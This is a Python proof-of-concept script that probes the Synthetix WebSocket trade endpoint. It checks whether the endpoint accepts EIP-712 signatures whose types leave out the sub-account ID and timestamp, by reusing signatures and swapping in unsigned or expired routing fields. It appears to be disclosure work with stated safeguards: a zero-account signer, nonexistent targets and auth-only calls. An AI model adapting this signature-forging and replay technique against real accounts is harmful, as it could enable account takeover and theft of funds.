#!/usr/bin/env python3
"""Synthetic proof that Synthetix WebSocket auth accepts unsigned routing fields.

Safety:
- deterministic EOA confirmed to own/manage/delegate zero Synthetix accounts;
- deliberately nonexistent account IDs;
- WebSocket `auth` only, no subscription, post, order, account read, or mutation;
- fixed low-noise matrix;
- response bodies are reduced to status and redacted error metadata.

The critical invariant under test is that `subAccountId` and the freshness value must be
cryptographically bound by one fixed authentication type. The server currently accepts arbitrary
client-supplied EIP-712 types. This probe signs types that omit one or both routing fields, then
changes those raw fields without changing the signature.
"""
from __future__ import annotations

import asyncio
import hashlib
import json
import pathlib
import re
import time
import urllib.error
import urllib.request
from dataclasses import dataclass
from typing import Any

from eth_account import Account
from eth_account.messages import encode_typed_data
from websockets.asyncio.client import connect

OUT = pathlib.Path("ws_auth_unsigned_fields")
OUT.mkdir(parents=True, exist_ok=True)

REST_INFO = "https://papi.synthetix.io/v1/info"
WS_TRADE = "wss://papi.synthetix.io/v1/ws/trade"
UA = "Mozilla/5.0 (compatible; authorized-synthetic-security-review/1.0)"
ACCOUNT = Account.from_key("0x" + "c3" * 32)
TARGET_A = 8_300_000_000_000_901
TARGET_B = 8_300_000_000_000_902
ZERO = "0x0000000000000000000000000000000000000000"
DOMAIN = {"name": "Synthetix", "version": "1", "chainId": 1, "verifyingContract": ZERO}
DOMAIN_FIELDS = [
    {"name": "name", "type": "string"},
    {"name": "version", "type": "string"},
    {"name": "chainId", "type": "uint256"},
    {"name": "verifyingContract", "type": "address"},
]
ADDRESS_RE = re.compile(r"0x[a-fA-F0-9]{40}")

FRONTEND_SUBACTION_FIELDS = [
    {"name": "subAccountId", "type": "uint256"},
    {"name": "action", "type": "string"},
    {"name": "expiresAfter", "type": "uint256"},
]
SDK_SUBACTION_FIELDS = [
    {"name": "subAccountId", "type": "uint256"},
    {"name": "action", "type": "string"},
    {"name": "nonce", "type": "uint256"},
    {"name": "expiresAfter", "type": "uint256"},
]
CLAIM_FIELDS = [{"name": "expiresAfter", "type": "uint256"}]
APPLY_FIELDS = [
    {"name": "referralCode", "type": "string"},
    {"name": "expiresAfter", "type": "uint256"},
]
AUTH_FIELDS = [
    {"name": "subAccountId", "type": "uint256"},
    {"name": "timestamp", "type": "uint256"},
    {"name": "action", "type": "string"},
]


def digest(value: str | bytes) -> str:
    if isinstance(value, str):
        value = value.encode()
    return hashlib.sha256(value).hexdigest()


def redact(value: Any) -> str | None:
    if value is None:
        return None
    text = ADDRESS_RE.sub("<address>", str(value))
    text = re.sub(r"\b\d{10,}\b", "<large-number>", text)
    return text[:1000]


def post_json(payload: dict[str, Any]) -> tuple[int, Any]:
    body = json.dumps(payload, separators=(",", ":")).encode()
    req = urllib.request.Request(
        REST_INFO,
        data=body,
        headers={"User-Agent": UA, "Content-Type": "application/json", "Accept": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=45) as response:
            raw = response.read(2 * 1024 * 1024)
            status = response.status
    except urllib.error.HTTPError as exc:
        raw = exc.read(2 * 1024 * 1024)
        status = exc.code
    try:
        return status, json.loads(raw)
    except Exception:
        return status, None


def account_count(response: Any) -> int | None:
    if isinstance(response, list):
        return len(response)
    if isinstance(response, dict):
        values = []
        recognized = False
        for key in ("subAccountIds", "managedSubAccountIds", "delegatedSubAccountIds"):
            item = response.get(key)
            if isinstance(item, list):
                recognized = True
                values.extend(item)
        return len(values) if recognized else None
    return None


def sign(primary: str, fields: list[dict[str, str]], signed_message: dict[str, Any]) -> str:
    encoded = encode_typed_data(
        full_message={
            "types": {primary: fields},
            "primaryType": primary,
            "domain": DOMAIN,
            "message": signed_message,
        }
    )
    signed = ACCOUNT.sign_message(encoded)
    return "0x" + format(signed.r, "064x") + format(signed.s, "064x") + format(signed.v, "02x")


def wire_message(
    primary: str,
    fields: list[dict[str, str]],
    signed_message: dict[str, Any],
    raw_extras: dict[str, Any],
) -> str:
    message = dict(signed_message)
    message.update(raw_extras)
    for field in fields:
        name = field["name"]
        if field["type"] == "uint256" and isinstance(message.get(name), int):
            message[name] = hex(message[name])
    # Raw routing fields are encoded like the official client, even when deliberately omitted
    # from the signed type definition.
    for name in ("subAccountId", "timestamp"):
        if isinstance(message.get(name), int):
            message[name] = hex(message[name])
    payload = {
        "types": {"EIP712Domain": DOMAIN_FIELDS, primary: fields},
        "primaryType": primary,
        "domain": DOMAIN,
        "message": message,
    }
    return json.dumps(payload, separators=(",", ":"))


@dataclass(frozen=True)
class Case:
    name: str
    primary: str
    fields: list[dict[str, str]]
    signed_message: dict[str, Any]
    raw_extras: dict[str, Any]
    signature_group: str


def make_cases(now: int) -> list[Case]:
    current_expiry = now + 60_000
    expired = now - 365 * 24 * 60 * 60 * 1000
    claim_message = {"expiresAfter": current_expiry}
    apply_message = {"referralCode": "PUBLIC-DEMO-CODE", "expiresAfter": current_expiry}
    frontend_read = {"subAccountId": TARGET_A, "action": "getPositions", "expiresAfter": current_expiry}
    frontend_expired = {"subAccountId": TARGET_A, "action": "getPositions", "expiresAfter": expired}
    sdk_read = {
        "subAccountId": TARGET_A,
        "action": "getPositions",
        "nonce": now,
        "expiresAfter": current_expiry,
    }
    canonical = {"subAccountId": TARGET_A, "timestamp": now, "action": "websocket_auth"}
    return [
        Case("canonical", "AuthMessage", AUTH_FIELDS, canonical, {}, "canonical"),
        Case(
            "frontend_read_plus_unsigned_timestamp",
            "SubAccountAction",
            FRONTEND_SUBACTION_FIELDS,
            frontend_read,
            {"timestamp": now},
            "frontend_current",
        ),
        Case(
            "frontend_expired_read_plus_unsigned_timestamp",
            "SubAccountAction",
            FRONTEND_SUBACTION_FIELDS,
            frontend_expired,
            {"timestamp": now},
            "frontend_expired",
        ),
        Case(
            "sdk_read_plus_unsigned_timestamp",
            "SubAccountAction",
            SDK_SUBACTION_FIELDS,
            sdk_read,
            {"timestamp": now},
            "sdk_current",
        ),
        Case(
            "claim_signature_unsigned_account_a",
            "ClaimReferralPayout",
            CLAIM_FIELDS,
            claim_message,
            {"subAccountId": TARGET_A, "timestamp": now, "action": "websocket_auth"},
            "claim_shared",
        ),
        Case(
            "claim_signature_unsigned_account_b",
            "ClaimReferralPayout",
            CLAIM_FIELDS,
            claim_message,
            {"subAccountId": TARGET_B, "timestamp": now, "action": "websocket_auth"},
            "claim_shared",
        ),
        Case(
            "claim_signature_old_unsigned_timestamp",
            "ClaimReferralPayout",
            CLAIM_FIELDS,
            claim_message,
            {"subAccountId": TARGET_A, "timestamp": now - 365 * 24 * 60 * 60 * 1000, "action": "anything"},
            "claim_shared",
        ),
        Case(
            "apply_signature_unsigned_account",
            "ApplyReferral",
            APPLY_FIELDS,
            apply_message,
            {"subAccountId": TARGET_A, "timestamp": now, "action": "not_auth"},
            "apply_shared",
        ),
    ]


def summarize(name: str, raw: str, elapsed: float, signature_hash: str) -> dict[str, Any]:
    try:
        parsed = json.loads(raw)
    except Exception:
        return {
            "name": name,
            "json": False,
            "elapsedMs": round(elapsed * 1000, 2),
            "rawSha256": digest(raw),
            "signatureSha256": signature_hash,
        }
    error = parsed.get("error") if isinstance(parsed, dict) else None
    result = parsed.get("result") if isinstance(parsed, dict) else None
    message = None
    code = None
    if isinstance(error, dict):
        message = error.get("message") or error.get("error")
        code = error.get("code")
    elif error is not None:
        message = error
    if message is None and isinstance(result, dict):
        message = result.get("message") or result.get("error")
    status = parsed.get("status") if isinstance(parsed, dict) else None
    if status is None and isinstance(result, dict):
        status = result.get("status")
    text = str(message) if message is not None else ""
    return {
        "name": name,
        "json": True,
        "status": status,
        "errorCode": code,
        "messageRedacted": redact(message),
        "messageSha256": digest(text) if text else None,
        "rawSha256": digest(raw),
        "signatureSha256": signature_hash,
        "elapsedMs": round(elapsed * 1000, 2),
    }


async def send_case(case: Case, signature: str) -> dict[str, Any]:
    message_json = wire_message(case.primary, case.fields, case.signed_message, case.raw_extras)
    request = {"id": "1", "method": "auth", "params": {"message": message_json, "signature": signature}}
    started = time.monotonic()
    try:
        async with connect(
            WS_TRADE,
            additional_headers={"User-Agent": UA},
            open_timeout=20,
            close_timeout=5,
            ping_interval=None,
            max_size=2 * 1024 * 1024,
        ) as ws:
            await ws.send(json.dumps(request, separators=(",", ":")))
            raw = str(await asyncio.wait_for(ws.recv(), timeout=15))
    except Exception as exc:  # noqa: BLE001
        return {
            "name": case.name,
            "transportError": type(exc).__name__,
            "transportMessage": redact(exc),
            "signatureSha256": digest(signature),
            "elapsedMs": round((time.monotonic() - started) * 1000, 2),
        }
    return summarize(case.name, raw, time.monotonic() - started, digest(signature))


async def main_async() -> None:
    status, parsed = post_json(
        {"params": {"action": "getSubAccountIds", "walletAddress": ACCOUNT.address, "includeDelegations": True}}
    )
    response = parsed.get("response") if isinstance(parsed, dict) else None
    count = account_count(response)
    if status != 200 or count != 0:
        raise RuntimeError(f"Synthetic signer preflight failed: status={status}, accountCount={count}")

    now = int(time.time() * 1000)
    cases = make_cases(now)
    signatures: dict[str, str] = {}
    results = []
    for index, case in enumerate(cases):
        signature = signatures.get(case.signature_group)
        if signature is None:
            signature = sign(case.primary, case.fields, case.signed_message)
            signatures[case.signature_group] = signature
        results.append(await send_case(case, signature))
        if index + 1 < len(cases):
            await asyncio.sleep(0.4)

    canonical = next(item for item in results if item["name"] == "canonical")
    same_gate = [
        item["name"]
        for item in results
        if item["name"] != "canonical"
        and item.get("status") == canonical.get("status")
        and item.get("messageSha256") == canonical.get("messageSha256")
    ]
    claim_items = [item for item in results if item["name"].startswith("claim_signature_")]
    claim_signature_hashes = sorted({item.get("signatureSha256") for item in claim_items})
    output = {
        "safety": "Synthetic zero-account signer; nonexistent targets; WebSocket auth only.",
        "syntheticAddress": ACCOUNT.address,
        "syntheticAccountCount": count,
        "targetHashes": [digest(str(TARGET_A)), digest(str(TARGET_B))],
        "caseCount": len(results),
        "canonical": canonical,
        "casesReachingCanonicalOwnershipGate": same_gate,
        "claimSignatureUniqueHashCount": len(claim_signature_hashes),
        "results": results,
    }
    (OUT / "summary.json").write_text(json.dumps(output, indent=2, sort_keys=True), encoding="utf-8")
    print(
        json.dumps(
            {
                "caseCount": len(results),
                "casesReachingCanonicalOwnershipGate": same_gate,
                "claimSignatureUniqueHashCount": len(claim_signature_hashes),
                "statuses": {item["name"]: item.get("status") for item in results},
            },
            indent=2,
        )
    )


if __name__ == "__main__":
    asyncio.run(main_async())
